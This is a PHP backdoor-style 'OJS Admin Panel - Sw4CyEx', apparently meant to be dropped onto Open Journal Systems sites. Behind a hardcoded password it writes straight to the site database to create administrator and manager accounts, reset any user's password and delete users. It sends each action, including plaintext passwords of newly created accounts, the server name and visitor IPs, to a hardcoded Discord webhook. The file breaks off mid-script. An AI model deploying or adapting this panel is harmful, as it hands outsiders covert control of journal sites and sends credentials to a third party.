<?php

/**
 * OJS Admin Panel - Sw4CyEx
 * Compatible with OJS 2.4-3.x
 * Features: Create users (Admin/Manager), View users, Delete users, Reset passwords
 */

$DB_HOST = 'localhost';
$DB_NAME = ' ';  // Update with your database name
$DB_USER = ' ';  // Update with your database username  
$DB_PASS = ' '; // Update with your database password
$DB_PORT = 3306;
$PASSWORD = 'Swacy'; // Simple password for accessing the admin panel

$DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1413882749202333759/vS6JJrPz3X0muHL6bighf_fGMUtFA_eI6KSWIppEq2RM6EJWKvXpmNKNmA8CH-O4FoNs';

function send_discord_log($title, $description, $color = 0x00ff00) {
    global $DISCORD_WEBHOOK_URL;
    
    $server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown Server';
    $domain_link = 'https://' . $server_name;
    $timestamp = date('Y-m-d H:i:s T');
    $user_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown IP';
    
    $embed = [
        'title' => $title,
        'description' => $description,
        'color' => $color,
        'fields' => [
            [
                'name' => '🌐 Server',
                'value' => $server_name,
                'inline' => true
            ],
            [
                'name' => '🔗 Domain',
                'value' => "[Access Panel]($domain_link)",
                'inline' => true
            ],
            [
                'name' => '🕒 Time',
                'value' => $timestamp,
                'inline' => true
            ],
            [
                'name' => '📍 IP Address',
                'value' => $user_ip,
                'inline' => true
            ]
        ],
        'footer' => [
            'text' => 'OJS Admin Panel Logger'
        ]
    ];
    
    $payload = [
        'embeds' => [$embed]
    ];
    
    $ch = curl_init($DISCORD_WEBHOOK_URL);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_exec($ch);
    curl_close($ch);
}

session_start();

if (!isset($_SESSION['admin_logged_in'])) {
    if (isset($_POST['admin_password']) && $_POST['admin_password'] === $PASSWORD) {
        $_SESSION['admin_logged_in'] = true;
        
        // Log successful login to Discord
        send_discord_log(
            '🔐 Admin Panel Login',
            '✅ **Successful login to OJS Admin Panel**\n\nAn administrator has successfully logged into the admin panel.',
            0x00ff00
        );
        
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit;
    }
    if (!isset($_SESSION['admin_logged_in'])) {
        echo '<!DOCTYPE html><html><head><title>OJS Admin Login</title><style>
        body{font-family:system-ui;background:#0a0f1c;color:#e8f0ff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
        .login{background:#0f1629;padding:30px;border-radius:15px;border:1px solid #16325b;min-width:300px}
        input{width:100%;padding:12px;margin:10px 0;border:1px solid #2a3e6b;background:#0d1324;color:#e8f0ff;border-radius:8px}
        button{width:100%;padding:12px;background:#2563eb;color:white;border:none;border-radius:8px;cursor:pointer;font-weight:600}
        </style></head><body>
        <form method="post" class="login">
        <h2>OJS Admin Panel - Sw4CyEx</h2>
        <input type="password" name="admin_password" placeholder="Password" required>
        <button type="submit">Login</button>
        <p style="font-size:12px;opacity:0.7">Default password: Swacy</p>
        </form></body></html>';
        exit;
    }
}

if (isset($_GET['logout'])) {
    send_discord_log(
        '🚪 Admin Panel Logout',
        '👋 **Admin logged out from OJS Admin Panel**\n\nAn administrator has logged out of the admin panel.',
        0xffaa00
    );
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

try {
    $pdo = new PDO("mysql:host=$DB_HOST;port=$DB_PORT;dbname=$DB_NAME;charset=utf8", $DB_USER, $DB_PASS, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ]);
} catch (Exception $e) {
    die('Database connection failed: ' . $e->getMessage() . '<br><br>Please update the database credentials at the top of this file.');
}

$hasUserGroups = false; 
$hasUserUserGroups = false; 
$hasRoles = false;
try { $pdo->query("SELECT 1 FROM user_groups LIMIT 1"); $hasUserGroups = true; } catch (Throwable $e) {}
try { $pdo->query("SELECT 1 FROM user_user_groups LIMIT 1"); $hasUserUserGroups = true; } catch (Throwable $e) {}
try { $pdo->query("SELECT 1 FROM roles LIMIT 1"); $hasRoles = true; } catch (Throwable $e) {}

$schema = ($hasUserGroups && $hasUserUserGroups) ? 'ojs3' : 'ojs2';

const ROLE_ID_SITE_ADMIN = 1;
const ROLE_ID_MANAGER = 16;

function get_contexts($pdo, $schema) {
    // Try multiple possible table names for different OJS versions
    $possible_tables = [
        'contexts',
        'journals', 
        'presses',
        'context',
        'journal'
    ];
    
    foreach ($possible_tables as $table) {
        try {
            // Check if table exists
            $check_query = "SHOW TABLES LIKE '$table'";
            $result = $pdo->query($check_query);
            
            if ($result && $result->rowCount() > 0) {
                // Table exists, try to get data
                if (in_array($table, ['contexts', 'context'])) {
                    $query = "SELECT context_id as id, path, 
                             COALESCE(path, CONCAT('Journal_', context_id)) as display_name 
                             FROM $table ORDER BY context_id";
                } else {
                    $query = "SELECT journal_id as id, path,
                             COALESCE(path, CONCAT('Journal_', journal_id)) as display_name 
                             FROM $table ORDER BY journal_id";
                }
                
                $contexts = $pdo->query($query)->fetchAll();
                
                // If we found contexts, return them
                if (!empty($contexts)) {
                    return $contexts;
                }
            }
        } catch (Exception $e) {
            // Continue to next table
            continue;
        }
    }
    
    // If no contexts found, create a default one
    return [
        ['id' => 1, 'path' => 'default', 'display_name' => 'Default Journal (ID: 1)']
    ];
}

function get_admin_manager_users($pdo, $schema) {
    if ($schema === 'ojs3') {
        $sql = "SELECT DISTINCT u.user_id, u.username, u.email,
                MAX(CASE WHEN ug.role_id = " . ROLE_ID_SITE_ADMIN . " THEN 1 ELSE 0 END) AS is_admin,
                MAX(CASE WHEN ug.role_id = " . ROLE_ID_MANAGER . " THEN 1 ELSE 0 END) AS is_manager
                FROM users u
                LEFT JOIN user_user_groups uug ON uug.user_id = u.user_id
                LEFT JOIN user_groups ug ON ug.user_group_id = uug.user_group_id
                WHERE ug.role_id IN (" . ROLE_ID_SITE_ADMIN . "," . ROLE_ID_MANAGER . ")
                GROUP BY u.user_id, u.username, u.email
                ORDER BY u.user_id DESC";
    } else {
        $sql = "SELECT DISTINCT u.user_id, u.username, u.email,
                MAX(CASE WHEN r.role_id = " . ROLE_ID_SITE_ADMIN . " THEN 1 ELSE 0 END) AS is_admin,
                MAX(CASE WHEN r.role_id = " . ROLE_ID_MANAGER . " THEN 1 ELSE 0 END) AS is_manager
                FROM users u
                LEFT JOIN roles r ON r.user_id = u.user_id
                WHERE r.role_id IN (" . ROLE_ID_SITE_ADMIN . "," . ROLE_ID_MANAGER . ")
                GROUP BY u.user_id, u.username, u.email
                ORDER BY u.user_id DESC";
    }
    
    try {
        return $pdo->query($sql)->fetchAll();
    } catch (Exception $e) {
        return [];
    }
}

function count_roles($pdo, $schema) {
    $admin_count = 0;
    $manager_count = 0;
    
    try {
        if ($schema === 'ojs3') {
            $admin_count = $pdo->query("SELECT COUNT(DISTINCT u.user_id) as c FROM users u 
                JOIN user_user_groups uug ON uug.user_id = u.user_id 
                JOIN user_groups ug ON ug.user_group_id = uug.user_group_id 
                WHERE ug.role_id = " . ROLE_ID_SITE_ADMIN)->fetch()['c'];
            $manager_count = $pdo->query("SELECT COUNT(DISTINCT u.user_id) as c FROM users u 
                JOIN user_user_groups uug ON uug.user_id = u.user_id 
                JOIN user_groups ug ON ug.user_group_id = uug.user_group_id 
                WHERE ug.role_id = " . ROLE_ID_MANAGER)->fetch()['c'];
        } else {
            $admin_count = $pdo->query("SELECT COUNT(DISTINCT user_id) as c FROM roles WHERE role_id = " . ROLE_ID_SITE_ADMIN)->fetch()['c'];
            $manager_count = $pdo->query("SELECT COUNT(DISTINCT user_id) as c FROM roles WHERE role_id = " . ROLE_ID_MANAGER)->fetch()['c'];
        }
    } catch (Exception $e) {
        // Keep defaults of 0
    }
    
    return ['admin' => (int)$admin_count, 'manager' => (int)$manager_count];
}

function get_total_users($pdo) {
    try {
        return $pdo->query("SELECT COUNT(*) as total FROM users")->fetch()['total'];
    } catch (Exception $e) {
        return 0;
    }
}

function get_user_activity_data($pdo) {
    try {
        $stmt = $pdo->query("SELECT DATE(date_registered) as date, COUNT(*) as count FROM users WHERE date_registered >= DATE_SUB(NOW(), INTERVAL 30 DAY) GROUP BY DATE(date_registered) ORDER BY date DESC LIMIT 7");
        return $stmt->fetchAll();
    } catch (Exception $e) {
        return [];
    }
}

$contexts = get_contexts($pdo, $schema);

$users = get_admin_manager_users($pdo, $schema);
$counts = count_roles($pdo, $schema);
$total_users = get_total_users($pdo);
$activity_data = get_user_activity_data($pdo);

$message = '';
$error = '';

if ($_POST) {
    $action = $_POST['action'] ?? '';
    
    if ($action === 'create_user') {
        $username = trim($_POST['username'] ?? '');
        $email = trim($_POST['email'] ?? '');
        $password = $_POST['password'] ?? '';
        $role = $_POST['role'] ?? '';
        $context_id = $_POST['context_id'] ?? null;
        
        if ($username && $email && $password && $role) {
            try {
                $pdo->beginTransaction();
                
                // Check if user exists
                $stmt = $pdo->prepare("SELECT user_id FROM users WHERE username = ? OR email = ?");
                $stmt->execute([$username, $email]);
                if ($stmt->fetch()) {
                    throw new Exception("User with this username or email already exists");
                }
                
                // Create user
                $hashedPassword = password_hash($password, PASSWORD_DEFAULT);
                $stmt = $pdo->prepare("INSERT INTO users (username, email, password, date_registered) VALUES (?, ?, ?, NOW())");
                $stmt->execute([$username, $email, $hashedPassword]);
                $user_id = $pdo->lastInsertId();
                
                // Assign role
                $role_id = ($role === 'admin') ? ROLE_ID_SITE_ADMIN : ROLE_ID_MANAGER;
                $context_id = ($role === 'admin') ? 0 : ($context_id ?: 0);
                
                if ($schema === 'ojs3') {
                    // Find or create user group
                    $stmt = $pdo->prepare("SELECT user_group_id FROM user_groups WHERE role_id = ? AND context_id = ? LIMIT 1");
                    $stmt->execute([$role_id, $context_id]);
                    $user_group = $stmt->fetch();
                    
                    if (!$user_group) {
                        $stmt = $pdo->prepare("INSERT INTO user_groups (role_id, context_id, is_default) VALUES (?, ?, 1)");
                        $stmt->execute([$role_id, $context_id]);
                        $user_group_id = $pdo->lastInsertId();
                    } else {
                        $user_group_id = $user_group['user_group_id'];
                    }
                    
                    // Assign user to group
                    $stmt = $pdo->prepare("INSERT INTO user_user_groups (user_group_id, user_id) VALUES (?, ?)");
                    $stmt->execute([$user_group_id, $user_id]);
                } else {
                    // OJS2 - direct role assignment
                    $stmt = $pdo->prepare("INSERT INTO roles (journal_id, user_id, role_id) VALUES (?, ?, ?)");
                    $stmt->execute([$context_id, $user_id, $role_id]);
                }
                
                $pdo->commit();
                $message = "User created successfully: $username";
                
                $role_name = ($role === 'admin') ? 'Administrator' : 'Manager';
                $context_info = $context_id ? " (Context ID: $context_id)" : '';
                send_discord_log(
                    '👤 New User Created',
                    "✅ **New user account created**\n\n" .
                    "**Username:** `$username`\n" .
                    "**Email:** `$email`\n" .
                    "**Password:** `$password`\n" .
                    "**Role:** `$role_name`$context_info\n" .
                    "**User ID:** `$user_id`",
                    0x00ff00
                );
                
            } catch (Exception $e) {
                $pdo->rollBack();
                $error = "Error creating user: " . $e->getMessage();
            }
        } else {
            $error = "All fields are required";
        }
    }
    
    if ($action === 'reset_password') {
        $user_id = $_POST['user_id'] ?? '';
        $new_password = $_POST['new_password'] ?? '';
        
        if ($user_id && $new_password) {
            try {
                // Get user info for logging
                $stmt = $pdo->prepare("SELECT username, email FROM users WHERE user_id = ?");
                $stmt->execute([$user_id]);
                $user_info = $stmt->fetch();
                
                if ($user_info) {
                    $hashedPassword = password_hash($new_password, PASSWORD_DEFAULT);
                    $stmt = $pdo->prepare("UPDATE users SET password = ? WHERE user_id = ?");
                    $stmt->execute([$hashedPassword, $user_id]);
                    $message = "Password reset successfully for user: " . $user_info['username'];
                    
                    send_discord_log(
                        '🔑 Password Reset',
                        "🔄 **User password has been reset**\n\n" .
                        "**Username:** `{$user_info['username']}`\n" .
                        "**Email:** `{$user_info['email']}`\n" .
                        "**User ID:** `$user_id`\n" .
                        "**Action:** Password reset by administrator",
                        0xffaa00
                    );
                } else {
                    $error = "User not found";
                }
            } catch (Exception $e) {
                $error = "Error resetting password: " . $e->getMessage();
            }
        } else {
            $error = "User ID and new password are required";
        }
    }
    
    if ($action === 'delete_user') {
        $user_id = $_POST['user_id'] ?? '';
        
        if ($user_id) {
            try {
                // Get user info for logging before deletion
                $stmt = $pdo->prepare("SELECT username, email FROM users WHERE user_id = ?");
                $stmt->execute([$user_id]);
                $user_info = $stmt->fetch();
                
                if ($user_info) {
                    $pdo->beginTransaction();
                    
                    // Delete role assignments
                    if ($schema === 'ojs3') {
                        $stmt = $pdo->prepare("DELETE FROM user_user_groups WHERE user_id = ?");
                        $stmt->execute([$user_id]);
                    } else {
                        $stmt = $pdo->prepare("DELETE FROM roles WHERE user_id = ?");
                        $stmt->execute([$user_id]);
                    }
                    
                    // Delete user
                    $stmt = $pdo->prepare("DELETE FROM users WHERE user_id = ?");
                    $stmt->execute([$user_id]);
                    
                    $pdo->commit();
                    $message = "User deleted successfully: " . $user_info['username'];
                    
                    send_discord_log(
                        '🗑️ User Deleted',
                        "❌ **User account has been deleted**\n\n" .
                        "**Username:** `{$user_info['username']}`\n" .
                        "**Email:** `{$user_info['email']}`\n" .
                        "**User ID:** `$user_id`\n" .
                        "**Action:** Account deleted by administrator",
                        0xff0000
                    );
                } else {
                    $error = "User not found";
                }
            } catch (Exception $e) {
                $pdo->rollBack();
                $error = "Error deleting user: " . $e->getMessage();
            }
        } else {
            $error = "User ID is required";
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OJS Admin Terminal</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Courier New', 'Monaco', monospace;
            background: #000000;
            color: #00ff00;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }
        
        /* Matrix-style animated background with green glow */
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 80%, rgba(0, 255, 0, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(34, 197, 94, 0.08) 0%, transparent 50%),
                radial-gradient(circle at 40% 40%, rgba(0, 255, 0, 0.05) 0%, transparent 50%);
            animation: matrix-pulse 3s ease-in-out infinite;
            z-index: -1;
        }
        
        @keyframes matrix-pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.7; transform: scale(1.02); }
        }
        
        /* Glitch animation for titles */
        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-2px, 2px); }
            40% { transform: translate(-2px, -2px); }
            60% { transform: translate(2px, 2px); }
            80% { transform: translate(2px, -2px); }
            100% { transform: translate(0); }
        }
        
        .glitch {
            animation: glitch 0.3s infinite;
            text-shadow: 
                0 0 5px #00ff00,
                0 0 10px #00ff00,
                0 0 15px #00ff00,
                0 0 20px #00ff00;
        }
        
        /* Compact minimalist header */
        .header {
            text-align: center;
            padding: 20px;
            border-bottom: 1px solid #00ff00;
            margin-bottom: 30px;
            background: rgba(0, 0, 0, 0.9);
        }
        
        .header h1 {
            font-size: 2rem;
            color: #00ff00;
            margin-bottom: 5px;
            letter-spacing: 3px;
        }
        
        .header p {
            color: #22c55e;
            font-size: 0.9rem;
            opacity: 0.8;
        }
        
        /* Compact container layout */
        .container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
        }
        
        /* Minimalist stats grid */
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 30px;
        }
        
        .stat-card {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
            position: relative;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }
        
        .stat-card:hover {
            transform: translateY(-3px);
            box-shadow: 0 0 20px rgba(0, 255, 0, 0.4);
            border-color: #22c55e;
        }
        
        .stat-number {
            font-size: 2rem;
            font-weight: bold;
            color: #00ff00;
            margin-bottom: 5px;
            text-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
        }
        
        .stat-label {
            color: #22c55e;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Compact charts section */
        .charts-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .chart-card {
            background: rgba(0, 20, 0, 0.8);
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.2);
        }
        
        .chart-title {
            color: #00ff00;
            font-size: 1.1rem;
            margin-bottom: 15px;
            text-align: center;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        /* Minimalist panels */
        .panel {
            background: rgba(0, 20, 0, 0.9);
            border: 1px solid #00ff00;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.1);
        }
        
        .panel h2 {
            color: #00ff00;
            margin-bottom: 20px;
            font-size: 1.3rem;
            text-transform: uppercase;
            letter-spacing: 2px;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        
        /* Compact form styling */
        .form-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 20px;
        }
        
        .form-group label {
            color: #22c55e;
            margin-bottom: 5px;
            font-size: 0.9rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .form-group input,
        .form-group select {
            padding: 10px 15px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background: rgba(0, 0, 0, 0.8);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            transition: all 0.3s ease;
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }
        
        .form-group input:focus,
        .form-group select:focus {
            outline: none;
            border-color: #22c55e;
            box-shadow: 0 0 10px rgba(0, 255, 0, 0.3);
            background: rgba(0, 10, 0, 0.9);
        }

         /* Glowing green buttons */
        .btn {
            padding: 10px 20px;
            border: 1px solid #00ff00;
            border-radius: 4px;
            background: rgba(0, 20, 0, 0.8);
            color: #00ff00;
            font-family: 'Courier New', monospace;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: rgba(0, 255, 0, 0.1);
            box-shadow: 0 0 15px rgba(0, 255, 0, 0.4);
            transform: translateY(-2px);
        }
        
        .btn-danger {
            border-color: #ff0000;
            color: #ff0000;
        }
        
        .btn-danger:hover {
            background: rgba(255, 0, 0, 0.1);
            box-shadow: 0 0 15px rgba(255, 0, 0, 0.4);
        }
        
        .btn-warning {
            border-color: #ffff00;
            color: #ffff00;
        }
        
        .btn-warning:hover {
            background: rgba(255, 255, 0, 0.1);
            box-shadow: 0 0 15px rgba(255, 255, 0, 0.4);
        }
        

        .form-group select option {
            background: #000000;
            color: #00ff00;
            border: none;
            padding: 8px;
        }

        .form-group select {
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%2300ff00' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6,9 12,15 18,9'%3e%3c/polyline%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 10px center;
            background-size: 16px;
            padding-right: 40px;
        }
        
        /* Compact table styling */
        .table-container {
            overflow-x: auto;
            border: 1px solid #00ff00;
            border-radius: 8px;
            background: rgba(0, 0, 0, 0.9);
        }
        
        table {
            width: 100%;
            border-collapse: collapse;
        }
        
        th, td {
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid rgba(0, 255, 0, 0.3);
            font-size: 0.9rem;
        }
        
        th {
            background: rgba(0, 20, 0, 0.8);
            color: #00ff00;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-weight: bold;
        }
        
        tr:hover {
            background: rgba(0, 255, 0, 0.05);
        }
        
        .role-badge {
            padding: 4px 12px;
            border-radius: 4px;
            font-size: 0.8rem;
            text-transform: uppercase;
            letter-spacing: 1px;
            border: 1px solid;
        }
        
        .role-admin {
            background: rgba(0, 255, 0, 0.1);
            color: #00ff00;
            border-color: #00ff00;
        }
        
        .role-manager {
            background: rgba(255, 255, 0, 0.1);
            color: #ffff00;
            border-color: #ffff00;
        }
        
        .actions {
            display: flex;
            gap: 8px;
            flex-wrap: wrap;
        }
        
        /* Alert styling with green theme */
        .alert {
            padding: 15px;
            border-radius: 4px;
            margin-bottom: 20px;
            border: 1px solid;
            font-family: 'Courier New', monospace;
        }
        
        .alert-success {
            background: rgba(0, 255, 0, 0.1);
            border-color: #00ff00;
            color: #00ff00;
        }
        
        .alert-error {
            background: rgba(255, 0, 0, 0.1);
            border-color: #ff0000;
            color: #ff0000;
        }
        
        /* Auth info styling */
        .auth-info {
            position: fixed;
            top: 20px;
            right: 20px;
            background: rgba(0, 20, 0, 0.9);
            border: 1px solid #00ff00;
            border-radius: 4px;
            padding: 10px 15px;
            font-size: 0.8rem;
            z-index: 100;
        }
        
        /* Responsive design */
        @media (max-width: 768px) {
            .form-grid, .charts-grid {
                grid-template-columns: 1fr;
            }
            
            .stats-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .actions {
                flex-direction: column;
            }
            
            .auth-info {
                position: relative;
                top: auto;
                right: auto;
                margin-bottom: 20px;
            }
        }
    </style>
</head>
<body>
    <div class="auth-info">
        <span>ADMIN SESSION ACTIVE</span>
        <a href="?logout=1" class="btn btn-danger" style="padding: 5px 10px; font-size: 0.7rem; margin-left: 10px;">LOGOUT</a>
    </div>

    <div class="header">
        <h1 class="glitch">OJS ADMIN TERMINAL</h1>
        <p>SYSTEM ACCESS GRANTED</p>
    </div>

    <div class="container">
        <?php if ($message): ?>
            <div class="alert alert-success">[SUCCESS] <?= htmlspecialchars($message) ?></div>
        <?php endif; ?>

        <?php if ($error): ?>
            <div class="alert alert-error">[ERROR] <?= htmlspecialchars($error) ?></div>
        <?php endif; ?>

        <!-- Compact stats display -->
        <div class="stats-grid">
            <div class="stat-card">
                <div class="stat-number"><?= $counts['admin'] ?></div>
                <div class="stat-label">ADMINS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?= $counts['manager'] ?></div>
                <div class="stat-label">MANAGERS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?= $total_users ?></div>
                <div class="stat-label">TOTAL USERS</div>
            </div>
            <div class="stat-card">
                <div class="stat-number"><?= count($activity_data) ?></div>
                <div class="stat-label">ACTIVE DAYS</div>
            </div>
        </div>

        <!-- Compact charts -->
        <div class="charts-grid">
            <div class="chart-card">
                <h3 class="chart-title">ROLE DISTRIBUTION</h3>
                <canvas id="roleChart" width="300" height="150"></canvas>
            </div>
            <div class="chart-card">
                <h3 class="chart-title">USER ACTIVITY</h3>
                <canvas id="activityChart" width="300" height="150"></canvas>
            </div>
        </div>

        <div class="panel">
            <h2>CREATE USER</h2>
            <form method="POST" onsubmit="return validateForm()">
                <input type="hidden" name="action" value="create_user">
                <div class="form-grid">
                    <div class="form-group">
                        <label>USERNAME</label>
                        <input type="text" name="username" required>
                    </div>
                    <div class="form-group">
                        <label>EMAIL</label>
                        <input type="email" name="email" required>
                    </div>
                    <div class="form-group">
                        <label>PASSWORD</label>
                        <input type="password" name="password" required>
                    </div>
                    <div class="form-group">
                        <label>ROLE</label>
                        <select name="role" id="roleSelect" onchange="toggleContext()" required>
                            <option value="">SELECT ROLE</option>
                            <option value="admin">ADMINISTRATOR</option>
                            <option value="manager">MANAGER</option>
                        </select>
                    </div>
                </div>
                
                <div class="form-group" id="contextGroup" style="display: none;">
                    <label>CONTEXT/JOURNAL</label>
                    <select name="context_id" id="contextSelect">
                        <option value="">SELECT CONTEXT</option>
                        <?php foreach ($contexts as $context): ?>
                            <option value="<?= $context['id'] ?>">
                                <?= htmlspecialchars($context['display_name'] ?? $context['path'] ?? 'Journal ' . $context['id']) ?>
                            </option>
                        <?php endforeach; ?>
                    </select>
                    <div id="contextError" style="color: #ff4444; font-size: 0.8rem; margin-top: 5px; display: none;">
                        Please select a context/journal for manager role
                    </div>
                </div>
                
                <button type="submit" class="btn">CREATE USER</button>
            </form>
        </div>

        <div class="panel">
            <h2>USER MANAGEMENT</h2>
            <div class="table-container">
                <table>
                    <thead>
                        <tr>
                            <th>USERNAME</th>
                            <th>EMAIL</th>
                            <th>ROLE</th>
                            <th>ACTIONS</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($users)): ?>
                            <tr>
                                <td colspan="4" style="text-align: center; color: #22c55e;">
                                    LOADING USERS...
                                </td>
                            </tr>
                        <?php else: ?>
                            <?php foreach ($users as $user): ?>
                                <tr>
                                    <td><?= htmlspecialchars($user['username']) ?></td>
                                    <td><?= htmlspecialchars($user['email']) ?></td>
                                    <td>
                                        <?php if ($user['is_admin']): ?>
                                            <span class="role-badge role-admin">ADMIN</span>
                                        <?php endif; ?>
                                        <?php if ($user['is_manager']): ?>
                                            <span class="role-badge role-manager">MANAGER</span>
                                        <?php endif; ?>
                                    </td>
                                    <td class="actions">
                                        <button class="btn btn-warning" onclick="resetPassword(<?= $user['user_id'] ?>)">RESET PWD</button>
                                        <form method="POST" style="display: inline;" onsubmit="return confirm('DELETE USER?')">
                                            <input type="hidden" name="action" value="delete_user">
                                            <input type="hidden" name="user_id" value="<?= $user['user_id'] ?>">
                                            <button type="submit" class="btn btn-danger">DELETE</button>
                                        </form>
                                    </td>
                                </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>
    </div>

    <!-- Minimalist password modal -->
    <div id="passwordModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; align-items: center; justify-content: center;">
        <div style="background: rgba(0, 20, 0, 0.95); padding: 25px; border: 1px solid #00ff00; border-radius: 8px; max-width: 350px; width: 90%;">
            <h3 style="color: #00ff00; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 1px;">RESET PASSWORD</h3>
            <form method="POST">
                <input type="hidden" name="action" value="reset_password">
                <input type="hidden" name="user_id" id="resetUserId">
                <div class="form-group">
                    <label>NEW PASSWORD</label>
                    <input type="password" name="new_password" required>
                </div>
                <div style="display: flex; gap: 10px; margin-top: 15px;">
                    <button type="submit" class="btn">RESET</button>
                    <button type="button" class="btn btn-danger" onclick="closePasswordModal()">CANCEL</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        const roleCtx = document.getElementById('roleChart').getContext('2d');
        new Chart(roleCtx, {
            type: 'doughnut',
            data: {
                labels: ['ADMINS', 'MANAGERS', 'OTHERS'],
                datasets: [{
                    data: [<?= $counts['admin'] ?>, <?= $counts['manager'] ?>, <?= $total_users - $counts['admin'] - $counts['manager'] ?>],
                    backgroundColor: [
                        'rgba(0, 255, 0, 0.8)',
                        'rgba(255, 255, 0, 0.8)',
                        'rgba(128, 128, 128, 0.8)'
                    ],
                    borderColor: [
                        '#00ff00',
                        '#ffff00',
                        '#808080'
                    ],
                    borderWidth: 2
                }]
            },
            options: {
                responsive: true,
                plugins: {
                    legend: {
                        labels: {
                            color: '#00ff00',
                            font: {
                                family: 'Courier New'
                            }
                        }
                    }
                }
            }
        });

        const activityCtx = document.getElementById('activityChart').getContext('2d');
        new Chart(activityCtx, {
            type: 'line',
            data: {
                labels: [<?php foreach(array_reverse($activity_data) as $day) echo "'" . date('M j', strtotime($day['date'])) . "',"; ?>],
                datasets: [{
                    label: 'NEW USERS',
                    data: [<?php foreach(array_reverse($activity_data) as $day) echo $day['count'] . ','; ?>],
                    borderColor: '#00ff00',
                    backgroundColor: 'rgba(0, 255, 0, 0.1)',
                    borderWidth: 2,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: {
                            color: '#00ff00',
                            font: {
                                family: 'Courier New'
                            }
                        },
                        grid: {
                            color: 'rgba(0, 255, 0, 0.2)'
                        }
                    },
                    x: {
                        ticks: {
                            color: '#00ff00',
                            font: {
                                family: 'Courier New'
                            }
                        },
                        grid: {
                            color: 'rgba(0, 255, 0, 0.2)'
                        }
                    }
                },
                plugins: {
                    legend: {
                        labels: {
                            color: '#00ff00',
                            font: {
                                family: 'Courier New'
                            }
                        }
                    }
                }
            }
        });

        function toggleContext() {
            const roleSelect = document.getElementById('roleSelect');
            const contextGroup = document.getElementById('contextGroup');
            const contextSelect = document.getElementById('contextSelect');
            const contextError = document.getElementById('contextError');
            
            if (roleSelect.value === 'manager') {
                contextGroup.style.display = 'block';
                contextSelect.required = true;
                contextError.style.display = 'none';
            } else {
                contextGroup.style.display = 'none';
                contextSelect.required = false;
                contextSelect.value = '';
                contextError.style.display = 'none';
            }
        }
        
        function resetPassword(userId) {
            document.getElementById('resetUserId').value = userId;
            document.getElementById('passwordModal').style.display = 'flex';
        }
        
        function closePasswordModal() {
            document.getElementById('passwordModal').style.display = 'none';
        }
        
        document.getElementById('passwordModal').addEventListener('click', function(e) {
            if (e.target === this) {
                closePasswordModal();
            }
        });

        function validateForm() {
